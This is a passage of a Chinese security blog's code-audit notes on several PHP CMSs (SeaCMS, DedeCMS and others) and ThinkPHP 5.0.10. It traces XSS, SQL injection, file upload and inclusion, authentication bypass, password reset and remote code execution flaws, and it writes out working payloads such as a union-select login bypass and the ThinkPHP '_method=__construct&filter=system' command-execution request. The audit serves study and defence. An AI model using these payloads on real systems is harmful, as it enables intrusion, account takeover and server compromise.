id="用户注册"><a href="#用户注册" class="headerlink" title="用户注册"></a>用户注册</h4><p>在注册时，邮箱插入xss代码</p><p><img src="/../images/image-20221202120912126-1686141975680.png" alt="image-20221202120912126"></p><p><img src="/../images/image-20221202120807928-1686141975682.png" alt="image-20221202120807928"></p><p><img src="/../images/image-20221202120844185-1686141975683.png" alt="image-20221202120844185"></p><h4 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h4><p>上传文件，只允许上传图片后缀的文件，上传后有给出图片路径，那么不能配合.htaccess，需要找到一个文件包含的点来包含文件。</p><img src="E:\typora img\image-20221202121559453.png" alt="image-20221202121559453" style="zoom:80%;" /><h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><p>是否存在越权,测试了没有</p><h4 id="发布新闻"><a href="#发布新闻" class="headerlink" title="发布新闻"></a>发布新闻</h4><img src="E:\typora img\image-20221202122851275.png" alt="image-20221202122851275" style="zoom:67%;" /><p>这里分类选择不了，应该是要管理员发布。</p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>管理员</p><p><img src="/../images/image-20221202123640697-1686141975683.png" alt="image-20221202123640697"></p><p>其他</p><p><img src="/../images/image-20221202125147298-1686141975683.png" alt="image-20221202125147298"></p><h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><p><img src="/../images/image-20221202123831559-1686141975683.png" alt="image-20221202123831559"></p><p>这里没有验证码验证，那么可以很轻松地进行爆破，得到usernmae&#x3D;admin，passwd&#x3D;admin</p><img src="E:\typora img\image-20221202124055555.png" alt="image-20221202124055555" style="zoom:67%;" /><p>进去之后，可以看到一个建议，install文件夹，上面通过dirsearch也扫描出了这个文件，如果我们可以使用这个文件夹来重新安装网站，那么我们就可以直接重置管理员了，可惜是不可以的。</p><p><img src="/../images/image-20221202124235008-1686141975683.png" alt="image-20221202124235008"></p><h4 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h4><p>发布本地新闻这里存在一个文件上传操作，但是也只能上传图片</p><p><img src="/../images/image-20221202175209000-1686141975683.png" alt="image-20221202175209000"></p><h4 id="会员管理"><a href="#会员管理" class="headerlink" title="会员管理"></a>会员管理</h4><p>可以发现触发了之前的xss，那么如果我们没有登陆上后台，也可以通过这个xss来🎣获取管理员的cookie。</p><p><img src="/../images/image-20221202124632258-1686141975683.png" alt="image-20221202124632258"></p><p>也可以修改管理员密码，而且没有任何验证，可以直接修改。。</p><p><img src="/../images/image-20221202175052927-1686141975686.png" alt="image-20221202175052927"></p><h2 id="白盒审计"><a href="#白盒审计" class="headerlink" title="白盒审计"></a>白盒审计</h2><p>先看一下目录</p><p><img src="/../images/image-20221202155440394-1686141975685.png" alt="image-20221202155440394"></p><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><p>先看一下前台的index.php，内容差不多就是渲染页面，没有用户可控的参数，所以关注其包含的其他文件。</p><p><img src="/../images/image-20221202135553953-1686141975686.png" alt="image-20221202135553953"></p><p>跟进common.inc.php看一下</p><p>关键部分，用来验证用户身份，其中cookie中的参数是可控的。</p><p><img src="/../images/image-20221202135942047-1686141975683.png" alt="image-20221202135942047"></p><p>先判断cookie中是否有user_id，有的话再继续判断user_name和user_pwd是否存在，如果存在就check_cookie，如果只有user_name存在就查询名字是否只有一个，其他情况set_cookie。</p><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>跟进check_cookie</p><p><img src="/../images/image-20221202140225964-1686141975683.png" alt="image-20221202140225964"></p><p>查username对应的密码，经过散列处理判断密码是否正确。</p><p>跟进getone–在include&#x2F;mysql.class.php中</p><p><img src="/../images/image-20221202140336939-1686141975683.png" alt="image-20221202140336939"></p><p><img src="/../images/image-20221202140349680-1686141975683.png" alt="image-20221202140349680"></p><p><img src="/../images/image-20221202185616902-1686141975684.png" alt="image-20221202185616902"></p><p>可以看到没有对sql语句做任何处理，直接用mysql_query进行查询，sql语句错误时，返回错误消息Query error，然后是前面加了一个@，所以不能用报错注入。</p><p>再观察include&#x2F;mysql.class.php可以发现</p><img src="E:\typora img\image-20221202190550614.png" alt="image-20221202190550614" style="zoom:80%;" /><p>发现存在宽字节注入，那么这个CMS就可以随便注入了。。。（因为所有的sql操作都是用这个mysql类）</p><p>以ad_js.php为例</p><img src="E:\typora img\image-20221202190230473.png" alt="image-20221202190230473" style="zoom:80%;" /><p><img src="/../images/image-20221202190707634-1686141975684.png" alt="image-20221202190707634"></p><h4 id="文件包含-文件上传"><a href="#文件包含-文件上传" class="headerlink" title="文件包含+文件上传"></a>文件包含+文件上传</h4><p>虽然有白名单限制，只能上传图片，但是没有对文件内容进行过滤</p><p><img src="/../images/image-20221202171406255-1686141975684.png" alt="image-20221202171406255"></p><p>并且在user.php中，没有对$_POST[‘pay’]进行过滤，存在目录穿越，就可以包含上传的用户头像。</p><p><img src="/../images/image-20221202185910243-1686141975684.png" alt="image-20221202185910243"></p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>publish.php</p><p><img src="/../images/image-20221202190938927-1686141975684.png" alt="image-20221202190938927"></p><p>user.php</p><p>​<img src="/../images/image-20221202194855624-1686141975684.png" alt="image-20221202194855624"></p><p>需要先插入一条新闻，新闻名为要删除的文件的路径。</p><h3 id="后台–-x2F-admin"><a href="#后台–-x2F-admin" class="headerlink" title="后台–&#x2F;admin"></a>后台–&#x2F;admin</h3><p>还是先看一下index.php，也是只是输出了CMS和系统的一些信息，所以关注其包含的文件</p><p><img src="/../images/image-20221202191939851-1686141975684.png" alt="image-20221202191939851"></p><p>关键内容</p><p><img src="/../images/image-20221202192232288-1686141975684.png" alt="image-20221202192232288"></p><p>对输入的参数都使用addslashes()进行转义,不过还有<code>$SERVER</code>没有进行处理。</p><img src="E:\typora img\image-20221202192459456.png" alt="image-20221202192459456" style="zoom:80%;" /><p>​使用session来验证admin身份。还是一样的使用check_cookie来判断，</p><p>​<img src="E:\typora img\image-20221202140225964.png" alt="image-20221202140225964" style="zoom:80%;" /></p><p>​需要得到admin的pwd和cookie_hash，这两个都在数据库中，可以利用前台的sql注入获得，所以可以通过这个来登录admin用户。</p><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p><img src="/../images/image-20221202195311948-1686141975684.png" alt="image-20221202195311948"></p><p><img src="/../images/image-20221202195409112-1686141975684.png" alt="image-20221202195409112"></p><h4 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h4><img src="E:\typora img\image-20221202191243192.png" alt="image-20221202191243192" style="zoom:80%;" /><img src="E:\typora img\image-20221202191403061.png" alt="image-20221202191403061" style="zoom: 80%;" /><p>文件路径只作了去除头尾空格的处理，存在目录穿越；文件内容实际上是调用了stripslashes，并没有过滤。</p><p>测试</p><img src="E:\typora img\image-20221202194248639.png" alt="image-20221202194248639" style="zoom:80%;" /><img src="E:\typora img\image-20221202194300861.png" alt="image-20221202194300861" style="zoom:80%;" /><h1 id="SeaCMS"><a href="#SeaCMS" class="headerlink" title="SeaCMS"></a>SeaCMS</h1><p>网站架构，无框架，目录结构如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">├─admin   <span class="comment"># 后台</span></span><br><span class="line">├─css  <span class="comment"># 存放css文件</span></span><br><span class="line">├─files  <span class="comment"># 存放页面</span></span><br><span class="line">├─images  <span class="comment"># 存放图片</span></span><br><span class="line">├─inc  <span class="comment"># 存放网站配置，校验，过滤文件</span></span><br><span class="line">├─install <span class="comment"># 网站安装</span></span><br><span class="line">├─seacmseditor <span class="comment"># 网站编辑器</span></span><br><span class="line">├─template <span class="comment"># 网站模板</span></span><br><span class="line">└─upload   <span class="comment"># 存放上传文件</span></span><br></pre></td></tr></table></figure><h2 id="查看入口文件"><a href="#查看入口文件" class="headerlink" title="查看入口文件"></a>查看入口文件</h2><p>所有的入口都是通过传递r参数来分发路由，对应files目录中的文件</p><p><img src="/../images/image-20230525134023397-1686141975684.png" alt="image-20230525134023397"></p><p><img src="/../images/image-20230525141822013-1686141975684.png" alt="image-20230525141822013"></p><p>这里只用<code>addslashes</code>进行了转义，明显路径穿越+文件包含</p><p><img src="/../images/image-20230525134741282-1686141975685.png" alt="image-20230525134741282"></p><p>其他思路</p><ul><li><p>如果是linux系统，也可以通过<code>pearcmd.php</code>来getshell</p><blockquote><p>在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装</p></blockquote></li><li><p>尝试%00截断路径，造成任意文件读取，不知道为啥失败了，环境：php5.3.29，<strong>magic_quotes_gpc</strong>&#x3D;OFF</p></li><li><p>如果php版本小于5.2.8，linux 需要文件名长于 4096，windows 需要长于 256，超过部分会被丢弃从而实现文件包含绕过后缀.php限制</p></li></ul><h2 id="查看配置文件"><a href="#查看配置文件" class="headerlink" title="查看配置文件"></a>查看配置文件</h2><p>通过install目录下的InstallLock.txt是否存在来判断是否安装，如果可以删除该文件，就可以配合入口文件的文件包含漏洞来重新安装网站。</p><p><img src="/../images/image-20230525135351792-1686141975685.png" alt="image-20230525135351792"></p><p>数据库编码为<code>utf-8</code>，不存在宽字节注入</p><p><img src="/../images/image-20230525135521039-1686141975685.png" alt="image-20230525135521039"></p><h2 id="查看身份校验文件"><a href="#查看身份校验文件" class="headerlink" title="查看身份校验文件"></a>查看身份校验文件</h2><p><img src="/../images/image-20230525140710113-1686141975685.png" alt="image-20230525140710113"></p><p>垂直越权，只要在cookie中加入user值</p><p><img src="/../images/image-20230525140957487-1686141975685.png" alt="image-20230525140957487"></p><h2 id="前台-1"><a href="#前台-1" class="headerlink" title="前台"></a>前台</h2><h3 id="about-php"><a href="#about-php" class="headerlink" title="about.php"></a><code>about.php</code></h3><p><img src="/../images/image-20230525141923350-1686141975685.png" alt="image-20230525141923350"></p><p>使用<code>addslashes</code>来过滤，逃逸不了引号，所以不存在sql注入</p><h3 id="concat-php"><a href="#concat-php" class="headerlink" title="concat.php"></a><code>concat.php</code></h3><p>sql都用了<code>addslashes</code>来过滤</p><p>但是存在xss</p><p><img src="/../images/image-20230525142829890-1686141975685.png" alt="image-20230525142829890"></p><p><img src="/../images/image-20230525142841766-1686141975685.png" alt="image-20230525142841766"></p><p><img src="/../images/image-20230525143133231-1686141975685.png" alt="image-20230525143133231"></p><p><img src="/../images/image-20230525143813133-1686141975685.png" alt="image-20230525143813133"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cookie:name=<span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525144008677-1686141975686.png" alt="image-20230525144008677"></p><h3 id="content-php"><a href="#content-php" class="headerlink" title="content.php"></a><code>content.php</code></h3><p>存在数字型终于可以注入了，配合<code>mysql_error</code>进行报错注入</p><p><img src="/../images/image-20230525144109692-1686141975686.png" alt="image-20230525144109692"></p><p><img src="/../images/image-20230525144251129-1686141975686.png" alt="image-20230525144251129"></p><h3 id="submit-php"><a href="#submit-php" class="headerlink" title="submit.php"></a><code>submit.php</code></h3><p><img src="/../images/image-20230525145929543-1686141975686.png" alt="image-20230525145929543"></p><p><img src="/../images/image-20230525151458927-1686141975686.png" alt="image-20230525151458927"></p><p>因为验证码正确后也不刷新，所以可以使用同一个验证码进行注入</p><p><img src="/../images/image-20230525151429571-1686141975686.png" alt="image-20230525151429571"></p><p>存储xss</p><p>过滤</p><p><img src="/../images/image-20230525145800880-1686141975686.png" alt="image-20230525145800880"></p><p>但是还是可以在name处保存</p><p>输出点</p><p><img src="/../images/image-20230525145901519-1686141975686.png" alt="image-20230525145901519"></p><h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><h3 id="后台登录-1"><a href="#后台登录-1" class="headerlink" title="后台登录"></a>后台登录</h3><p><img src="/../images/image-20230525153016604-1686141975686.png" alt="image-20230525153016604"></p><p>没有过滤，可以使用联合查询构造临时用户数据登录,或者报错注入拿到密码后解密登录</p><p>判断字段数</p><p><img src="/../images/image-20230525153002742-1686141975686.png" alt="image-20230525153002742"></p><p>确定用户名，密码字段位置</p><p><img src="/../images/image-20230525154135880-1686141975687.png" alt="image-20230525154135880"></p><p>联合查询登陆</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user=-<span class="number">1</span><span class="string">&#x27;+union+select+1,2,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">&#x27;,5,6,7,8#&amp;password=1&amp;login=yes</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230525154322362-1686141975687.png" alt="image-20230525154322362"></p><h3 id="文件上传处"><a href="#文件上传处" class="headerlink" title="文件上传处"></a>文件上传处</h3><p><code>up.class.php</code></p><p>白名单，文件大小检测，文件时间戳重命名,图片裁剪生成缩略图</p><p>没啥用，需要配合其他漏洞</p><h1 id="DedeCMS"><a href="#DedeCMS" class="headerlink" title="DedeCMS"></a>DedeCMS</h1><p>进行功能点审计</p><h2 id="全局总览"><a href="#全局总览" class="headerlink" title="全局总览"></a>全局总览</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">入口文件主要有三个</span><br><span class="line">前台</span><br><span class="line">后台：dede/</span><br><span class="line">会员：member/</span><br></pre></td></tr></table></figure><p>全局函数<br>在项目根目录的index文件包含的&#x2F;include&#x2F;common.inc.php中<br>过滤的：</p><p>检查和注册外部提交的变量，<code>CheckRequest</code></p><p><img src="/../images/image-20230526102737909-1686141975687.png" alt="image-20230526102737909"></p><p>文件上传的</p><p><img src="/../images/image-20230526102806414-1686141975687.png" alt="image-20230526102806414"></p><p>分页参数的</p><p><img src="/../images/image-20230526102852980-1686141975687.png" alt="image-20230526102852980"></p><p>函数集</p><p><img src="/../images/image-20230526102920759-1686141975687.png" alt="image-20230526102920759"></p><p><code>include/filter.inc.php</code></p><p>过滤不文明内容的😅，不是为了防御漏洞的</p><h2 id="文件上传功能点"><a href="#文件上传功能点" class="headerlink" title="文件上传功能点"></a>文件上传功能点</h2><h3 id="dede-archives-do-php"><a href="#dede-archives-do-php" class="headerlink" title=" /dede/archives_do.php"></a><code> /dede/archives_do.php</code></h3><p><img src="/../images/image-20230525201745708-1686141975687.png" alt="image-20230525201745708"></p><p><img src="/../images/image-20230525200159854-1686141975687.png" alt="image-20230525200159854"></p><p>实际上是调用了<code>upload.helper.php</code>中的<code>AdminUpload</code>方法</p><p><img src="/../images/image-20230525201545164-1686141975687.png" alt="image-20230525201545164"></p><p><img src="/../images/image-20230525201700590-1686141975687.png" alt="image-20230525201700590"></p><p>可以看到只对文件的MIME类型进行了校验,没有对文件后缀进行校验</p><p>再看一下全局防护<code>uploadsafe.inc.php</code></p><p><img src="/../images/image-20230525201856657-1686141975688.png" alt="image-20230525201856657"></p><p><img src="/../images/image-20230525201949967-1686141975688.png" alt="image-20230525201949967"></p><p>虽然有黑名单，但是黑名单对管理员用户无效</p><p><img src="/../images/image-20230525202104709-1686141975688.png" alt="image-20230525202104709"></p><p>最后用<code>getimagesize</code>进行校验，可以添加文件头绕过。</p><p>综上所属，是管理员身份，只需要修改MIME和文件头即可绕过过滤。</p><p><img src="/../images/image-20230525191610086-1686141975688.png" alt="image-20230525191610086"></p><p><img src="/../images/image-20230525191553945-1686141975688.png" alt="image-20230525191553945"></p><h3 id="dede-media-add-php"><a href="#dede-media-add-php" class="headerlink" title="/dede/media_add.php"></a><code>/dede/media_add.php</code></h3><p><img src="/../images/image-20230525205532459-1686141975688.png" alt="image-20230525205532459"></p><p>跟上一个差不多，只校验MIME，不校验后缀，只是多了一步加水印的，所以传一个php后缀的图片马</p><p><img src="/../images/image-20230525205858924-1686141975688.png" alt="image-20230525205858924"></p><h3 id="dede-file-manage-control-php"><a href="#dede-file-manage-control-php" class="headerlink" title="/dede/file_manage_control.php"></a><code>/dede/file_manage_control.php</code></h3><p><img src="/../images/image-20230525204329712-1686141975689.png" alt="image-20230525204329712"></p><p><img src="/../images/image-20230525210840452-1686141975688.png" alt="image-20230525210840452"></p><p><img src="/../images/image-20230525211553932-1686141975689.png" alt="image-20230525211553932"></p><p>没有对内容进行过滤，这里可以写🐎</p><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><p><code>plus/download.php</code></p><p><img src="/../images/image-20230526100708534-1686141975688.png" alt="image-20230526100708534"></p><p><img src="/../images/image-20230526100724469-1686141975689.png" alt="image-20230526100724469"></p><p><img src="/../images/image-20230526101319599-1686141975690.png" alt="image-20230526101319599"></p><p><code>$linkinfo</code>压根不存在，没有过滤，对url先进行base64加密，再进行url加密即可</p><p><img src="/../images/image-20230526101138188-1686141975689.png" alt="image-20230526101138188"></p><h2 id="会员任意密码修改"><a href="#会员任意密码修改" class="headerlink" title="会员任意密码修改"></a>会员任意密码修改</h2><p>先看一下会员中心的逻辑</p><p><code>member/index.php</code></p><p>校验用户是否登录，登录则进入会员个人中心</p><p><code>member/index_do.php</code></p><p>会员操作与<code>$fmdo</code>参数匹配</p><p>重置密码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index_do.php?fmdo=user&amp;dopost=xxx</span><br></pre></td></tr></table></figure><p>重置密码逻辑在<code>resetpassword.php</code>中,大致逻辑如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword.htm&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpwd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 找回密码第一步</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;safequestion&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 密码问题判断</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$dopost</span> == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 找回密码第二步</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点关注密码问题判断</p><p><img src="/../images/image-20230526123219865-1686141975689.png" alt="image-20230526123219865"></p><p>使用了弱比较，如果用户没有设置密码问题，默认值如下</p><p><img src="/../images/image-20230526123041472-1686141975689.png" alt="image-20230526123041472"></p><p>所以可以构造<code>safequestion=0.0&amp;safeanswer=</code>来进入该if语句</p><p>跟进 sn，最终是重定向到修改密码页面</p><p><img src="/../images/image-20230526123510601-1686141975689.png" alt="image-20230526123510601"></p><h2 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h2><p>看一下怎么处理的</p><p><code>member/config.php</code></p><p><img src="/../images/image-20230526130641724-1686141975689.png" alt="image-20230526130641724"></p><p>跟进</p><p><img src="/../images/image-20230526130848007-1686141975689.png" alt="image-20230526130848007"></p><p><img src="/../images/image-20230526132740089-1686141975689.png" alt="image-20230526132740089"></p><p>对得到的<code>M_ID</code>做了<code>intval</code>处理，最后根据<code>M_ID</code>的值从数据库中取出对应用户</p><p>跟进<code>getnum</code></p><p><img src="/../images/image-20230526132102568-1686141975689.png" alt="image-20230526132102568"></p><p>跟进<code>getcookie</code></p><p><img src="/../images/image-20230526131125230-1686141975689.png" alt="image-20230526131125230"></p><p>两个IF，第一个if判断Cookie中的DedeUserID和DedeUserID__ckMD5,如果都存在进入第二个if，校验cookie有效性，可以看到是通过加盐再加密的方式，所以按理说是无法伪造cookie的。</p><p>但是可以从<code>/member/index.php</code>可以来获取这个加密后的值</p><p>搜索<code>getcookie</code>得到</p><p><img src="/../images/image-20230526131657609-1686141975689.png" alt="image-20230526131657609"></p><p>跟踪<code>$last_vid</code></p><p><img src="/../images/image-20230526132259147-1686141975690.png" alt="image-20230526132259147"></p><p>如果<code>$last_vid</code>为空，那么将<code>$uid</code>赋值给<code>$last_vid</code>，并作为参数传递给<code>PutCookie</code>函数</p><p>跟进<code>PutCookie</code>函数</p><p><img src="/../images/image-20230526132158862-1686141975690.png" alt="image-20230526132158862"></p><p>可以看到跟登录的<code>getcookie</code>加密方式一样。</p><p>总结一下：</p><p>登录</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">用户的身份由DedeUserID的值来决定</span><br><span class="line"></span><br><span class="line">校验：DedeUserID__ckMd5的值和<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.DedeUserID)</span><br></pre></td></tr></table></figure><p>访问<code>member/index.php?uid=xx</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">last_vid=uid</span><br><span class="line"></span><br><span class="line">last_vid__ckMd5=<span class="title function_ invoke__">md5</span>(<span class="variable">$cfg_cookie_encode</span>.uid)</span><br></pre></td></tr></table></figure><p>所以让</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p>就可以绕过getcookie的校验，但是还有一个问题是<code>uid</code>指的是用户的<code>userid</code>，<code>DedeUserID</code>指的是用户的<code>mid</code>，所以要让<code>uid</code>为<code>mid</code>才可以伪造身份</p><p><img src="/../images/image-20230526134001725-1686141975691.png" alt="image-20230526134001725"></p><p>还记得上面的处理吗？</p><p><img src="/../images/image-20230526134147020-1686141975690.png" alt="image-20230526134147020"></p><p>所以只需要构造一个含有数字1的字符串就可以伪造admin的身份。</p><p>注册一个用户名为1admin的用户</p><p><img src="/../images/image-20230526125711799-1686141975690.png" alt="image-20230526125711799"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DedeUserID=last_vid=uid</span><br><span class="line">DedeUserID__ckMd5=last_vid__ckMd5</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230526125702071-1686141975690.png" alt="image-20230526125702071"></p><h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer create<span class="literal">-project</span> <span class="literal">--prefer-dist</span> topthink/think=<span class="number">5.0</span>.<span class="number">10</span> tp5.<span class="number">0.10</span></span><br></pre></td></tr></table></figure><p>将 <a href="https://so.csdn.net/so/search?q=composer&spm=1001.2101.3001.7020">composer</a>.json 文件的 require 字段设置成如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;require&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;php&quot;</span>: <span class="string">&quot;&gt;=5.4.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;topthink/framework&quot;</span>: <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更新</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><p>将其放置到网站目录下，访问<a href="http://127.0.0.1/tp5.0.10/public/">http://127.0.0.1/tp5.0.10/public/</a></p><p><img src="/../images/image-20230529155309821-1686141975690.png" alt="image-20230529155309821"></p><h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><p>推荐阅读<a href="https://www.cnblogs.com/yokan/p/16102644.html">https://www.cnblogs.com/yokan/p/16102644.html</a></p><h3 id="路由和参数传递"><a href="#路由和参数传递" class="headerlink" title="路由和参数传递"></a>路由和参数传递</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//servername/index.php/模块/控制器/操作/[参数名/参数值...] # pathinfo模式</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//servername/index.php?s=/index/Index/index    # 兼容方式</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?name=<span class="number">213</span></span><br><span class="line">/name/<span class="number">123</span></span><br></pre></td></tr></table></figure><p>如控制器Index：<code>application/index/controller/Index.php</code></p><p><img src="/../images/image-20230531232416306.png" alt="image-20230531232416306"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello?name=world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php/index/Index/hello/name/world</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello/name/world</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello&amp;name=world</span></span><br></pre></td></tr></table></figure><h2 id="Request类任意调用-construct方法导致的rce"><a href="#Request类任意调用-construct方法导致的rce" class="headerlink" title="Request类任意调用__construct方法导致的rce"></a>Request类任意调用__construct方法导致的rce</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Request核心类**$method** 来自可控的 <strong>$_POST</strong> 数组，而且在获取之后没有进行任何检查，直接把它作为 <strong>Request</strong> 类的方法进行调用，同时，该方法传入的参数是可控数据 <strong>$_POST</strong> 。导致可以随意调用 <strong>Request</strong> 类的部分方法</p><blockquote><p><strong>过程：</strong></p><p>让method等于 <code>__construct</code>魔术方法，然后里面的 <code>foreach</code>函数造成变量覆盖。然后通过<strong>Request</strong> 类中的 <code>param</code>方法最终又调用了<code>filterValue</code>方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数，从而执行任意命令</p></blockquote><blockquote><p><strong>Request</strong> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <strong>filterValue</strong> 方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数</p></blockquote><p>以5.0.10版本为例</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/tp5.0.10/public/index.php</span><br><span class="line"></span><br><span class="line"># post</span><br><span class="line">_method=__construct&amp;filter=system&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531225820851.png" alt="image-20230531225820851"></p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><p>第一个断点下在<code>thinkphp/libary/think/App.php</code>文件，调用<code>routeCheck</code>进行调度解析这里</p><p><img src="/../images/image-20230531221156861.png" alt="image-20230531221156861"></p><p>跟进<code>routeCheck</code></p><p><img src="/../images/image-20230531221218359.png" alt="image-20230531221218359"></p><p>跟进<code>check</code></p><p><img src="/../images/image-20230531221233596.png" alt="image-20230531221233596"></p><p>跟进<code>method</code></p><p><img src="/../images/image-20230531221259178.png" alt="image-20230531221259178"></p><p><code>var_method</code>在<code>application/config.php</code>中</p><p><img src="/../images/image-20230531222320838.png" alt="image-20230531222320838"></p><p>所以这里可以控制<code>method</code>变量，从而任意调用Request类的方法。</p><p>如果调用<code>__construct</code>方法</p><p><img src="/../images/image-20230531221707200.png" alt="image-20230531221707200"></p><p>存在一个<code>foreach</code>循环，如果传入的<code>options</code>数组的键名为该类的属性，就用键值覆盖该属性的值。</p><p><img src="/../images/image-20230531222852250.png" alt="image-20230531222852250"></p><p>继续往下</p><p>在<code>App::run()</code>方法里面，如果我们开启了debug模式，则会调用<code>Request::param()</code>方法：</p><p><img src="/../images/image-20230531223011915.png" alt="image-20230531223011915"></p><p>就算没有开启debug模式，下面的exec方法也会调用</p><p><img src="/../images/image-20230531230604547.png" alt="image-20230531230604547"></p><p><img src="/../images/image-20230531220640414.png" alt="image-20230531220640414"></p><p>跟进<code>Request::param()</code>方法</p><p>将获取到的post参数用<code>array_merge</code>与get方式的参数进行合并</p><p><img src="/../images/image-20230531225110758.png" alt="image-20230531225110758"></p><p>最后将其传入<code>input</code>中</p><p><img src="/../images/image-20230531224212939.png" alt="image-20230531224212939"></p><p>跟进<code>Request::input()</code>,<code>array_walk_recursive</code>  对数组中的每个成员递归地应用用户函数</p><p><img src="/../images/image-20230531224435122.png" alt="image-20230531224435122"></p><p>然后<code>filterValue</code>方法中，调用了<code>call_user_func</code>造成任意命令执行</p><p><img src="/../images/image-20230531223158698.png" alt="image-20230531223158698"></p><h3 id="关键点总结"><a href="#关键点总结" class="headerlink" title="关键点总结"></a>关键点总结</h3><p>From：七月火师傅的一张流程图</p><p><img src="/../images/1964477-20220405155310200-1040131440.png" alt="img"></p><h3 id="其他版本"><a href="#其他版本" class="headerlink" title="其他版本"></a>其他版本</h3><p>流程大同小异</p><p>payload总结：<a href="https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce">https://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码执行绕过</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/"/>
